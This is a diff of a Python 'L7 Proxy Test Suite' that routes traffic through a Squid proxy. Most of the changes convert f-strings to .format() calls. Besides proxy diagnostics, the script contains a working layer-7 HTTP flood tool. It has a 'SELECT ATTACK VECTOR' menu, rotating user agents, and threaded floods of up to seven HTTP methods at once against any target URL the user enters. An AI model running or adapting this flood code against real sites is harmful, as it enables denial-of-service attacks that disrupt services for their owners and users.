@@ -34,31 +34,32 @@ import urllib.error
 import urllib.parse
 import http.client
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
+from typing import Optional, Tuple, List, Dict
 
 # ── Proxy config ──────────────────────────────────────────────────────────────
 PROXY_HOST = "10.0.10.118"
 PROXY_PORT = 3128
-PROXY_URL  = f"http://{PROXY_HOST}:{PROXY_PORT}"
+PROXY_URL  = "http://{}:{}".format(PROXY_HOST, PROXY_PORT)
 
 # ── Colour helpers ─────────────────────────────────────────────────────────────
-GREEN  = "\033[92m"
-RED    = "\033[91m"
-YELLOW = "\033[93m"
-CYAN   = "\033[96m"
-MAGENTA= "\033[95m"
-BOLD   = "\033[1m"
-DIM    = "\033[2m"
-RESET  = "\033[0m"
+GREEN   = "\033[92m"
+RED     = "\033[91m"
+YELLOW  = "\033[93m"
+CYAN    = "\033[96m"
+MAGENTA = "\033[95m"
+BOLD    = "\033[1m"
+DIM     = "\033[2m"
+RESET   = "\033[0m"
 
-def ok(msg):    print(f"  {GREEN}[+]{RESET} {msg}")
-def fail(msg):  print(f"  {RED}[-]{RESET} {msg}")
-def info(msg):  print(f"  {CYAN}[*]{RESET} {msg}")
-def warn(msg):  print(f"  {YELLOW}[!]{RESET} {msg}")
+def ok(msg):    print("  {}[+]{} {}".format(GREEN, RESET, msg))
+def fail(msg):  print("  {}[-]{} {}".format(RED, RESET, msg))
+def info(msg):  print("  {}[*]{} {}".format(CYAN, RESET, msg))
+def warn(msg):  print("  {}[!]{} {}".format(YELLOW, RESET, msg))
 def section(title):
-    print(f"\n{BOLD}{CYAN}{'─'*60}{RESET}")
-    print(f"{BOLD}{CYAN}  {title}{RESET}")
-    print(f"{BOLD}{CYAN}{'─'*60}{RESET}")
+    print("\n{}{}{}{}".format(BOLD, CYAN, "─"*60, RESET))
+    print("{}{}  {}{}".format(BOLD, CYAN, title, RESET))
+    print("{}{}{}{}".format(BOLD, CYAN, "─"*60, RESET))
 
 # ── Build a urllib opener that forces all traffic through the proxy ────────────
 def build_opener():
@@ -93,10 +94,10 @@ def test_proxy_reachability():
         s  = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=5)
         ms = (time.time() - t0) * 1000
         s.close()
-        ok(f"Connected to {PROXY_HOST}:{PROXY_PORT} in {ms:.1f} ms")
+        ok("Connected to {}:{} in {:.1f} ms".format(PROXY_HOST, PROXY_PORT, ms))
         return True
     except Exception as e:
-        fail(f"Cannot reach proxy: {e}")
+        fail("Cannot reach proxy: {}".format(e))
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -115,10 +116,11 @@ def test_egress_ip():
                 ip = json.loads(body).get("origin", body)
             except Exception:
                 ip = body
-            ok(f"Egress IP reported by {url.split('/')[2]}: {BOLD}{ip}{RESET}  ({ms:.0f} ms)")
+            ok("Egress IP reported by {}: {}{}{}  ({:.0f} ms)".format(
+                url.split("/")[2], BOLD, ip, RESET, ms))
             return ip
         except Exception as e:
-            warn(f"{url} failed: {e}")
+            warn("{} failed: {}".format(url, e))
     fail("Could not determine egress IP")
     return None
 
@@ -126,7 +128,7 @@ def test_egress_ip():
 # 3. HTTP GET
 # ─────────────────────────────────────────────────────────────────────────────
 def test_http_get(target_url):
-    section(f"TEST 3 – HTTP GET  →  {target_url}")
+    section("TEST 3 – HTTP GET  →  {}".format(target_url))
     try:
         req = urllib.request.Request(target_url, method="GET")
         t0  = time.time()
@@ -135,25 +137,25 @@ def test_http_get(target_url):
             headers = dict(resp.headers)
             body    = resp.read()
         ms = (time.time() - t0) * 1000
-        ok(f"Status        : {status} {resp.reason}")
-        ok(f"Response time : {ms:.0f} ms")
-        ok(f"Body length   : {len(body):,} bytes")
-        info(f"Server        : {headers.get('Server', 'n/a')}")
-        info(f"Content-Type  : {headers.get('Content-Type', 'n/a')}")
-        info(f"X-Cache       : {headers.get('X-Cache', 'n/a')}")
+        ok("Status        : {} {}".format(status, resp.reason))
+        ok("Response time : {:.0f} ms".format(ms))
+        ok("Body length   : {:,} bytes".format(len(body)))
+        info("Server        : {}".format(headers.get("Server", "n/a")))
+        info("Content-Type  : {}".format(headers.get("Content-Type", "n/a")))
+        info("X-Cache       : {}".format(headers.get("X-Cache", "n/a")))
         return True
     except urllib.error.HTTPError as e:
-        warn(f"HTTP error {e.code}: {e.reason}")
+        warn("HTTP error {}: {}".format(e.code, e.reason))
         return False
     except Exception as e:
-        fail(f"GET failed: {e}")
+        fail("GET failed: {}".format(e))
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 4. HTTP HEAD
 # ─────────────────────────────────────────────────────────────────────────────
 def test_http_head(target_url):
-    section(f"TEST 4 – HTTP HEAD  →  {target_url}")
+    section("TEST 4 – HTTP HEAD  →  {}".format(target_url))
     try:
         req = urllib.request.Request(target_url, method="HEAD")
         t0  = time.time()
@@ -161,26 +163,26 @@ def test_http_head(target_url):
             status  = resp.status
             headers = dict(resp.headers)
         ms = (time.time() - t0) * 1000
-        ok(f"Status : {status} {resp.reason}  ({ms:.0f} ms)")
+        ok("Status : {} {}  ({:.0f} ms)".format(status, resp.reason, ms))
         for h in ["Server", "Content-Type", "X-Powered-By",
                   "Strict-Transport-Security", "X-Frame-Options",
                   "X-Content-Type-Options", "Content-Security-Policy"]:
             val = headers.get(h)
             if val:
-                info(f"{h:35s}: {val}")
+                info("{:35s}: {}".format(h, val))
         return True
     except urllib.error.HTTPError as e:
-        warn(f"HTTP {e.code} on HEAD – trying GET fallback")
+        warn("HTTP {} on HEAD – trying GET fallback".format(e.code))
         return False
     except Exception as e:
-        fail(f"HEAD failed: {e}")
+        fail("HEAD failed: {}".format(e))
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 5. HTTP OPTIONS
 # ─────────────────────────────────────────────────────────────────────────────
 def test_http_options(target_url):
-    section(f"TEST 5 – HTTP OPTIONS  →  {target_url}")
+    section("TEST 5 – HTTP OPTIONS  →  {}".format(target_url))
     try:
         req = urllib.request.Request(target_url, method="OPTIONS")
         req.add_header("Origin", "https://evil.lab")
@@ -190,25 +192,25 @@ def test_http_options(target_url):
             headers = dict(resp.headers)
             status  = resp.status
         ms = (time.time() - t0) * 1000
-        ok(f"Status : {status}  ({ms:.0f} ms)")
+        ok("Status : {}  ({:.0f} ms)".format(status, ms))
         for h in ["Allow", "Access-Control-Allow-Origin",
                   "Access-Control-Allow-Methods",
                   "Access-Control-Allow-Headers"]:
             val = headers.get(h)
             if val:
-                info(f"{h:40s}: {val}")
+                info("{:40s}: {}".format(h, val))
         return True
     except urllib.error.HTTPError as e:
-        warn(f"HTTP {e.code} – server may not allow OPTIONS")
+        warn("HTTP {} – server may not allow OPTIONS".format(e.code))
     except Exception as e:
-        fail(f"OPTIONS failed: {e}")
+        fail("OPTIONS failed: {}".format(e))
     return False
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 6. Redirect-chain follow
 # ─────────────────────────────────────────────────────────────────────────────
 def test_redirect_chain(target_url):
-    section(f"TEST 6 – Redirect Chain  →  {target_url}")
+    section("TEST 6 – Redirect Chain  →  {}".format(target_url))
     visited = []
     current = target_url
 
@@ -241,34 +243,34 @@ def test_redirect_chain(target_url):
             visited.append((hop + 1, current, e.code))
             break
         except Exception as e:
-            fail(f"Redirect hop {hop+1} error: {e}")
+            fail("Redirect hop {} error: {}".format(hop + 1, e))
             break
 
     for hop, url, code in visited:
         colour = GREEN if str(code).startswith("2") else YELLOW
-        print(f"  {colour}Hop {hop}: [{code}] {url}{RESET}")
+        print("  {}Hop {}: [{}] {}{}".format(colour, hop, code, url, RESET))
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 7. DNS resolution
 # ─────────────────────────────────────────────────────────────────────────────
 def test_dns(hostname):
-    section(f"TEST 7 – DNS Resolution  →  {hostname}")
+    section("TEST 7 – DNS Resolution  →  {}".format(hostname))
     try:
         t0      = time.time()
         results = socket.getaddrinfo(hostname, 80)
         ms      = (time.time() - t0) * 1000
-        ips: list[str] = list({str(r[4][0]) for r in results})
-        ok(f"Resolved in {ms:.1f} ms  →  {', '.join(ips)}")
+        ips     = list({str(r[4][0]) for r in results})
+        ok("Resolved in {:.1f} ms  →  {}".format(ms, ", ".join(ips)))
         return ips
     except Exception as e:
-        fail(f"DNS failed: {e}")
+        fail("DNS failed: {}".format(e))
         return []
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 8. TLS/SSL Certificate info
 # ─────────────────────────────────────────────────────────────────────────────
 def test_tls(hostname, port=443):
-    section(f"TEST 8 – TLS Certificate  →  {hostname}:{port}")
+    section("TEST 8 – TLS Certificate  →  {}:{}".format(hostname, port))
     try:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
@@ -285,34 +287,33 @@ def test_tls(hostname, port=443):
         proto    = tls_sock.version()
         tls_sock.close()
 
-        ok(f"TLS version : {proto}")
-        ok(f"Cipher      : {cipher[0] if cipher else 'n/a'}")
+        ok("TLS version : {}".format(proto))
+        ok("Cipher      : {}".format(cipher[0] if cipher else "n/a"))
         if cert:
-            cert_any: dict = cert  # type: ignore[assignment]
-            subject: dict = {}
-            for rdn in cert_any.get("subject", []):
+            subject = {}
+            for rdn in cert.get("subject", []):
                 for attr in rdn:
                     subject[attr[0]] = attr[1]
-            issuer: dict = {}
-            for rdn in cert_any.get("issuer", []):
+            issuer = {}
+            for rdn in cert.get("issuer", []):
                 for attr in rdn:
                     issuer[attr[0]] = attr[1]
-            info(f"Subject CN  : {subject.get('commonName', 'n/a')}")
-            info(f"Issuer      : {issuer.get('organizationName', 'n/a')}")
-            info(f"Not before  : {cert_any.get('notBefore', 'n/a')}")
-            info(f"Not after   : {cert_any.get('notAfter',  'n/a')}")
+            info("Subject CN  : {}".format(subject.get("commonName", "n/a")))
+            info("Issuer      : {}".format(issuer.get("organizationName", "n/a")))
+            info("Not before  : {}".format(cert.get("notBefore", "n/a")))
+            info("Not after   : {}".format(cert.get("notAfter",  "n/a")))
         else:
             warn("Certificate data not exposed (verify mode is CERT_NONE)")
         return True
     except Exception as e:
-        fail(f"TLS probe failed: {e}")
+        fail("TLS probe failed: {}".format(e))
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 9. HTTP POST
 # ─────────────────────────────────────────────────────────────────────────────
 def test_http_post(target_url):
-    section(f"TEST 9 – HTTP POST  →  {target_url}")
+    section("TEST 9 – HTTP POST  →  {}".format(target_url))
     payload = json.dumps({"test": "l7_probe", "ts": datetime.utcnow().isoformat()}).encode()
     try:
         req = urllib.request.Request(target_url, data=payload, method="POST")
@@ -322,19 +323,19 @@ def test_http_post(target_url):
             status = resp.status
             body   = resp.read()
         ms = (time.time() - t0) * 1000
-        ok(f"Status : {status}  ({ms:.0f} ms)  body={len(body):,} bytes")
+        ok("Status : {}  ({:.0f} ms)  body={:,} bytes".format(status, ms, len(body)))
         return True
     except urllib.error.HTTPError as e:
-        warn(f"HTTP {e.code} on POST ({e.reason}) – may be expected")
+        warn("HTTP {} on POST ({}) – may be expected".format(e.code, e.reason))
     except Exception as e:
-        fail(f"POST failed: {e}")
+        fail("POST failed: {}".format(e))
     return False
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 10. Latency benchmark
 # ─────────────────────────────────────────────────────────────────────────────
 def test_latency(target_url, samples=10):
-    section(f"TEST 10 – Latency Benchmark  ({samples}× GET)  →  {target_url}")
+    section("TEST 10 – Latency Benchmark  ({}× GET)  →  {}".format(samples, target_url))
     times = []
     for i in range(1, samples + 1):
         try:
@@ -344,17 +345,17 @@ def test_latency(target_url, samples=10):
                 resp.read()
             ms = (time.time() - t0) * 1000
             times.append(ms)
-            print(f"    Sample {i:>2}/{samples}: {ms:>7.1f} ms")
+            print("    Sample {:>2}/{}: {:>7.1f} ms".format(i, samples, ms))
         except Exception as e:
-            warn(f"Sample {i} failed: {e}")
+            warn("Sample {} failed: {}".format(i, e))
         time.sleep(0.3)
 
     if times:
-        avg  = sum(times) / len(times)
-        mn   = min(times)
-        mx   = max(times)
-        jit  = mx - mn
-        ok(f"Min={mn:.1f} ms  Avg={avg:.1f} ms  Max={mx:.1f} ms  Jitter={jit:.1f} ms")
+        avg = sum(times) / len(times)
+        mn  = min(times)
+        mx  = max(times)
+        jit = mx - mn
+        ok("Min={:.1f} ms  Avg={:.1f} ms  Max={:.1f} ms  Jitter={:.1f} ms".format(mn, avg, mx, jit))
     else:
         fail("No latency samples collected")
 
@@ -372,7 +373,9 @@ _USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
 ]
 
-def _single_request(target_url: str, idx: int, method: str) -> tuple[bool, float, int]:
+
+def _single_request(target_url, idx, method):
+    # type: (str, int, str) -> Tuple[bool, float, int]
     """Fire one request through the proxy; return (ok, latency_ms, status)."""
     opener = build_opener()
     opener.addheaders = [
@@ -383,7 +386,7 @@ def _single_request(target_url: str, idx: int, method: str) -> tuple[bool, float
     ]
     t0 = time.time()
     try:
-        body_data: bytes | None = None
+        body_data = None  # type: Optional[bytes]
         if method in _BODY_METHODS:
             body_data = json.dumps({
                 "probe": "l7_flood",
@@ -407,14 +410,8 @@ def _single_request(target_url: str, idx: int, method: str) -> tuple[bool, float
         return False, 0.0, 0
 
 
-def run_flood(
-    target_url: str,
-    workers: int,
-    rps: float,
-    duration: float,
-    method: str,
-    label: str | None = None,
-) -> dict:
+def run_flood(target_url, workers, rps, duration, method, label=None):
+    # type: (str, int, float, float, str, Optional[str]) -> Dict
     """
     Run a flood for `duration` seconds at up to `rps` requests/sec
     using `workers` concurrent connections.
@@ -422,47 +419,54 @@ def run_flood(
     """
     display_label = label or method
     section(
-        f"FLOOD — {BOLD}{display_label}{RESET}{CYAN}  |  "
-        f"{workers} conns  |  {rps:.0f} RPS target  |  {duration:.0f}s\n"
-        f"  {CYAN}Target : {target_url}{RESET}\n"
-        f"  {CYAN}Proxy  : {PROXY_URL}{RESET}"
+        "FLOOD — {}{}{}{}  |  {} conns  |  {:.0f} RPS target  |  {:.0f}s\n"
+        "  {}Target : {}{}\n"
+        "  {}Proxy  : {}{}".format(
+            BOLD, display_label, RESET, CYAN,
+            workers, rps, duration,
+            CYAN, target_url, RESET,
+            CYAN, PROXY_URL, RESET,
+        )
     )
 
-    success      = 0
-    errors       = 0
-    latencies: list[float] = []
-    status_counts: dict[int, int] = {}
-    lock         = threading.Lock()
+    success       = [0]
+    errors        = [0]
+    total_sent    = [0]
+    latencies     = []   # type: List[float]
+    status_counts = {}   # type: Dict[int, int]
+    lock          = threading.Lock()
 
-    # Rate-limiter token bucket
-    interval     = 1.0 / rps if rps > 0 else 0.0
-    wall_start   = time.time()
-    deadline     = wall_start + duration
-    bar_width    = 40
-    total_sent   = 0
+    interval   = 1.0 / rps if rps > 0 else 0.0
+    wall_start = time.time()
+    deadline   = wall_start + duration
+    bar_width  = 40
 
-    def _print_progress() -> None:
+    def _print_progress():
         elapsed = time.time() - wall_start
         pct     = min(elapsed / duration, 1.0)
         filled  = int(bar_width * pct)
-        bar     = "█" * filled + "░" * (bar_width - filled)
-        actual_rps = total_sent / elapsed if elapsed > 0 else 0
+        bar     = "\u2588" * filled + "\u2591" * (bar_width - filled)
+        actual_rps = total_sent[0] / elapsed if elapsed > 0 else 0
         print(
-            f"\r  [{bar}] {elapsed:.1f}/{duration:.0f}s  "
-            f"{GREEN}{success}✓{RESET} {RED}{errors}✗{RESET}  "
-            f"{CYAN}{actual_rps:.1f} RPS{RESET}   ",
-            end="", flush=True
+            "\r  [{}] {:.1f}/{:.0f}s  "
+            "{}{}{}  {}{}{}  "
+            "{}{:.1f} RPS{}   ".format(
+                bar, elapsed, duration,
+                GREEN, success[0], RESET,
+                RED, errors[0], RESET,
+                CYAN, actual_rps, RESET,
+            ),
+            end="", flush=True,
         )
 
-    def _worker(idx: int) -> None:
-        nonlocal success, errors, total_sent
+    def _worker(idx):
         ok_flag, ms, status = _single_request(target_url, idx, method)
         with lock:
-            total_sent += 1
+            total_sent[0] += 1
             if ok_flag:
-                success += 1
+                success[0] += 1
             else:
-                errors += 1
+                errors[0] += 1
             if ms > 0:
                 latencies.append(ms)
             status_counts[status] = status_counts.get(status, 0) + 1
@@ -472,23 +476,16 @@ def run_flood(
     with ThreadPoolExecutor(max_workers=workers) as pool:
         futures = []
         while time.time() < deadline:
-            # Throttle submission to match target RPS
             submit_time = time.time()
             futures.append(pool.submit(_worker, idx))
             idx += 1
-            # Drain completed futures to avoid memory bloat
-            still_running = []
-            for f in futures:
-                if not f.done():
-                    still_running.append(f)
+            still_running = [f for f in futures if not f.done()]
             futures = still_running
-
             elapsed_submit = time.time() - submit_time
             sleep_needed   = interval - elapsed_submit
             if sleep_needed > 0:
                 time.sleep(sleep_needed)
 
-        # Wait for in-flight requests
         for f in futures:
             try:
                 f.result(timeout=15)
@@ -498,15 +495,16 @@ def run_flood(
     wall_elapsed = time.time() - wall_start
     print()  # newline after progress bar
 
-    # ── Summary ───────────────────────────────────────────────────────────────
-    colour = MAGENTA if label else CYAN   # multi-vector uses magenta label
-    print(f"\n{BOLD}  ── {colour}{display_label}{RESET}{BOLD} Flood Summary {'─'*30}{RESET}")
-    ok(f"Total sent     : {total_sent:,}")
-    ok(f"Succeeded (2xx): {GREEN}{success:,}{RESET}")
-    if errors:
-        warn(f"Failed         : {RED}{errors:,}{RESET}")
-    ok(f"Wall time      : {wall_elapsed:.2f} s")
-    ok(f"Throughput     : {BOLD}{total_sent / wall_elapsed:.1f} RPS{RESET}")
+    colour = MAGENTA if label else CYAN
+    print("\n{}  ── {}{}{} Flood Summary {}{}{}".format(
+        BOLD, colour, display_label, RESET, BOLD, "─"*30, RESET))
+    ok("Total sent     : {:,}".format(total_sent[0]))
+    ok("Succeeded (2xx): {}{:,}{}".format(GREEN, success[0], RESET))
+    if errors[0]:
+        warn("Failed         : {}{:,}{}".format(RED, errors[0], RESET))
+    ok("Wall time      : {:.2f} s".format(wall_elapsed))
+    ok("Throughput     : {}{:.1f} RPS{}".format(
+        BOLD, total_sent[0] / wall_elapsed if wall_elapsed > 0 else 0, RESET))
 
     if latencies:
         latencies.sort()
@@ -514,56 +512,54 @@ def run_flood(
         p50 = latencies[int(len(latencies) * 0.50)]
         p90 = latencies[int(len(latencies) * 0.90)]
         p99 = latencies[int(len(latencies) * 0.99)]
-        ok(f"Latency avg    : {avg:.1f} ms")
-        ok(f"Latency p50    : {p50:.1f} ms")
-        ok(f"Latency p90    : {p90:.1f} ms")
-        ok(f"Latency p99    : {p99:.1f} ms")
+        ok("Latency avg    : {:.1f} ms".format(avg))
+        ok("Latency p50    : {:.1f} ms".format(p50))
+        ok("Latency p90    : {:.1f} ms".format(p90))
+        ok("Latency p99    : {:.1f} ms".format(p99))
 
-    print(f"\n  {DIM}HTTP status breakdown:{RESET}")
+    print("\n  {}HTTP status breakdown:{}".format(DIM, RESET))
     for code in sorted(status_counts):
         col = GREEN if str(code).startswith("2") else (
               YELLOW if str(code).startswith("3") else RED)
-        print(f"    {col}HTTP {code}{RESET} : {status_counts[code]:,}")
+        print("    {}HTTP {}{} : {:,}".format(col, code, RESET, status_counts[code]))
 
     return {
-        "method":      display_label,
-        "total":       total_sent,
-        "success":     success,
-        "errors":      errors,
-        "wall":        wall_elapsed,
-        "rps_actual":  total_sent / wall_elapsed if wall_elapsed > 0 else 0,
+        "method":     display_label,
+        "total":      total_sent[0],
+        "success":    success[0],
+        "errors":     errors[0],
+        "wall":       wall_elapsed,
+        "rps_actual": total_sent[0] / wall_elapsed if wall_elapsed > 0 else 0,
     }
 
 
-def run_multi_vector(
-    target_url: str,
-    workers: int,
-    rps: float,
-    duration: float,
-) -> None:
+def run_multi_vector(target_url, workers, rps, duration):
+    # type: (str, int, float, float) -> None
     """
     Launch all 7 HTTP methods simultaneously, each with its own thread pool.
     Workers and RPS are split evenly across vectors.
     """
     methods = ["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS"]
     n       = len(methods)
-
-    # Divide resources evenly across vectors
     w_each  = max(1, workers // n)
     r_each  = max(1.0, rps / n)
 
     section(
-        f"MULTI-VECTOR FLOOD  |  {n} vectors simultaneously\n"
-        f"  {CYAN}{workers} total conns ({w_each}/vector)  |  "
-        f"{rps:.0f} total RPS ({r_each:.1f}/vector)  |  {duration:.0f}s{RESET}\n"
-        f"  {CYAN}Vectors : {', '.join(methods)}{RESET}\n"
-        f"  {CYAN}Target  : {target_url}{RESET}"
+        "MULTI-VECTOR FLOOD  |  {} vectors simultaneously\n"
+        "  {}{} total conns ({}/vector)  |  {:.0f} total RPS ({:.1f}/vector)  |  {:.0f}s{}\n"
+        "  {}Vectors : {}{}\n"
+        "  {}Target  : {}{}".format(
+            n,
+            CYAN, workers, w_each, rps, r_each, duration, RESET,
+            CYAN, ", ".join(methods), RESET,
+            CYAN, target_url, RESET,
+        )
     )
 
-    results: list[dict] = []
+    results     = []   # type: List[Dict]
     result_lock = threading.Lock()
 
-    def _launch(method: str) -> None:
+    def _launch(method):
         r = run_flood(
             target_url=target_url,
             workers=w_each,
@@ -581,48 +577,51 @@ def run_multi_vector(
     for t in threads:
         t.join()
 
-    # ── Aggregate summary ─────────────────────────────────────────────────────
-    total_sent    = sum(r["total"]   for r in results)
-    total_success = sum(r["success"] for r in results)
-    total_errors  = sum(r["errors"]  for r in results)
-    avg_rps       = sum(r["rps_actual"] for r in results)
+    total_sent    = sum(r["total"]      for r in results)
+    total_success = sum(r["success"]    for r in results)
+    total_errors  = sum(r["errors"]     for r in results)
+    combined_rps  = sum(r["rps_actual"] for r in results)
 
-    print(f"\n{BOLD}{MAGENTA}{'='*60}{RESET}")
-    print(f"{BOLD}{MAGENTA}  MULTI-VECTOR AGGREGATE SUMMARY{RESET}")
-    print(f"{BOLD}{MAGENTA}{'='*60}{RESET}")
-    ok(f"Vectors fired  : {n}  ({', '.join(methods)})")
-    ok(f"Total requests : {total_sent:,}")
-    ok(f"Succeeded      : {GREEN}{total_success:,}{RESET}")
+    print("\n{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
+    print("{}{}  MULTI-VECTOR AGGREGATE SUMMARY{}".format(BOLD, MAGENTA, RESET))
+    print("{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
+    ok("Vectors fired  : {}  ({})".format(n, ", ".join(methods)))
+    ok("Total requests : {:,}".format(total_sent))
+    ok("Succeeded      : {}{:,}{}".format(GREEN, total_success, RESET))
     if total_errors:
-        warn(f"Failed         : {RED}{total_errors:,}{RESET}")
-    ok(f"Combined RPS   : {BOLD}{avg_rps:.1f}{RESET}")
-    print(f"\n  {'Method':<10} {'Sent':>8} {'2xx':>8} {'Fail':>8} {'RPS':>8}")
-    print(f"  {'─'*46}")
+        warn("Failed         : {}{:,}{}".format(RED, total_errors, RESET))
+    ok("Combined RPS   : {}{:.1f}{}".format(BOLD, combined_rps, RESET))
+    print("\n  {:<10} {:>8} {:>8} {:>8} {:>8}".format("Method", "Sent", "2xx", "Fail", "RPS"))
+    print("  {}".format("─"*46))
     for r in sorted(results, key=lambda x: x["method"]):
-        print(
-            f"  {CYAN}{r['method']:<10}{RESET}"
-            f" {r['total']:>8,}"
-            f" {GREEN}{r['success']:>8,}{RESET}"
-            f" {RED}{r['errors']:>8,}{RESET}"
-            f" {r['rps_actual']:>8.1f}"
-        )
-    print(f"\n{BOLD}{MAGENTA}{'='*60}{RESET}\n")
+        print("  {}{:<10}{}  {:>8,}  {}{:>8,}{}  {}{:>8,}{}  {:>8.1f}".format(
+            CYAN, r["method"], RESET,
+            r["total"],
+            GREEN, r["success"], RESET,
+            RED, r["errors"], RESET,
+            r["rps_actual"],
+        ))
+    print("\n{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
+    print()
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Interactive helpers
 # ─────────────────────────────────────────────────────────────────────────────
 
-def _prompt_int(prompt: str, default: int) -> int:
+def _prompt_int(prompt, default):
+    # type: (str, int) -> int
     try:
-        raw = input(f"  {BOLD}{prompt}{RESET} [{default}]: ").strip()
+        raw = input("  {}{}{} [{}]: ".format(BOLD, prompt, RESET, default)).strip()
         return int(raw) if raw else default
     except (ValueError, KeyboardInterrupt, EOFError):
         return default
 
-def _prompt_float(prompt: str, default: float) -> float:
+
+def _prompt_float(prompt, default):
+    # type: (str, float) -> float
     try:
-        raw = input(f"  {BOLD}{prompt}{RESET} [{default}]: ").strip()
+        raw = input("  {}{}{} [{}]: ".format(BOLD, prompt, RESET, default)).strip()
         return float(raw) if raw else default
     except (ValueError, KeyboardInterrupt, EOFError):
         return default
@@ -641,34 +640,48 @@ ATTACK_MENU = [
 ]
 
 
-def show_menu() -> str:
+def show_menu():
+    # type: () -> str
     """Print the attack-vector menu and return the chosen mode key."""
-    print(f"\n{BOLD}{CYAN}  ┌─────────────────────────────────────────────┐{RESET}")
-    print(f"{BOLD}{CYAN}  │          SELECT ATTACK VECTOR                │{RESET}")
-    print(f"{BOLD}{CYAN}  ├─────────────────────────────────────────────┤{RESET}")
-    for i, (label, _) in enumerate(ATTACK_MENU, 1):
-        icon = "⚡" if _ == "multi" else ("🔍" if _ == "diag" else "💥")
-        print(f"{BOLD}{CYAN}  │{RESET}  {BOLD}{i:>2}.{RESET} {icon}  {label:<38}{BOLD}{CYAN}│{RESET}")
-    print(f"{BOLD}{CYAN}  └─────────────────────────────────────────────┘{RESET}")
+    print("\n{}{}\u250c{}{}\u2500{}{}{}\u2510{}".format(
+        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))
+    print("{}{}  \u2502{}  {}SELECT ATTACK VECTOR{}                    {}{}  \u2502{}".format(
+        BOLD, CYAN, RESET, BOLD, RESET, BOLD, CYAN, RESET))
+    print("{}{}\u251c{}{}\u2500{}{}{}\u2524{}".format(
+        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))
+    for i, (label, key) in enumerate(ATTACK_MENU, 1):
+        icon = "\u26a1" if key == "multi" else ("\U0001f50d" if key == "diag" else "\U0001f4a5")
+        print("{}{}  \u2502{}  {}{:>2}.{} {}  {:<38}{}{}  \u2502{}".format(
+            BOLD, CYAN, RESET,
+            BOLD, i, RESET,
+            icon, label,
+            BOLD, CYAN, RESET,
+        ))
+    print("{}{}\u2514{}{}\u2500{}{}{}\u2518{}".format(
+        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))
 
     while True:
         try:
-            raw = input(f"\n  {BOLD}Enter choice (1–{len(ATTACK_MENU)}): {RESET}").strip()
+            raw = input("\n  {}Enter choice (1\u2013{}): {}".format(
+                BOLD, len(ATTACK_MENU), RESET)).strip()
             idx = int(raw) - 1
             if 0 <= idx < len(ATTACK_MENU):
                 label, mode = ATTACK_MENU[idx]
-                print(f"  {GREEN}✔  Selected:{RESET} {BOLD}{label}{RESET}")
+                print("  {}\u2714  Selected:{} {}{}{}".format(
+                    GREEN, RESET, BOLD, label, RESET))
                 return mode
             else:
-                warn(f"Please enter a number between 1 and {len(ATTACK_MENU)}")
+                warn("Please enter a number between 1 and {}".format(len(ATTACK_MENU)))
         except (ValueError, KeyboardInterrupt, EOFError):
             print("\nAborted.")
             sys.exit(0)
 
 
-def prompt_flood_params() -> tuple[int, float, float]:
+def prompt_flood_params():
+    # type: () -> Tuple[int, float, float]
     """Ask only for concurrent connections, target RPS, and duration."""
-    print(f"\n{BOLD}{CYAN}  ── Flood Parameters ──────────────────────────{RESET}")
+    print("\n{}{}  \u2500\u2500 Flood Parameters \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{}".format(
+        BOLD, CYAN, RESET))
     workers  = _prompt_int("Concurrent connections (workers)", 50)
     rps      = _prompt_float("Target RPS (requests/sec)",       100.0)
     duration = _prompt_float("Duration (seconds)",               30.0)
@@ -679,14 +692,16 @@ def prompt_flood_params() -> tuple[int, float, float]:
 # Main
 # ─────────────────────────────────────────────────────────────────────────────
 def main():
-    print(f"\n{BOLD}{'='*60}{RESET}")
-    print(f"{BOLD}  L7 Proxy Test Suite — Squid @ {PROXY_HOST}:{PROXY_PORT}{RESET}")
-    print(f"{BOLD}{'='*60}{RESET}")
-    print(f"{DIM}  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
+    print("\n{}{}{}".format(BOLD, "="*60, RESET))
+    print("{}  L7 Proxy Test Suite \u2014 Squid @ {}:{}{}".format(
+        BOLD, PROXY_HOST, PROXY_PORT, RESET))
+    print("{}{}{}".format(BOLD, "="*60, RESET))
+    print("{}  Started : {}{}".format(
+        DIM, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), RESET))
 
-    # ── Get target URL ────────────────────────────────────────────────────────
     try:
-        raw = input(f"\n{BOLD}  Enter target URL (e.g. https://example.com): {RESET}").strip()
+        raw = input("\n{}  Enter target URL (e.g. https://example.com): {}".format(
+            BOLD, RESET)).strip()
     except (KeyboardInterrupt, EOFError):
         print("\nAborted.")
         sys.exit(0)
@@ -704,19 +719,16 @@ def main():
     use_https  = parsed.scheme == "https"
     tls_port   = parsed.port or 443
 
-    print(f"\n{DIM}  Target URL : {target_url}{RESET}")
-    print(f"{DIM}  Hostname   : {hostname}{RESET}")
-    print(f"{DIM}  Proxy      : {PROXY_URL}{RESET}")
+    print("\n{}  Target URL : {}{}".format(DIM, target_url, RESET))
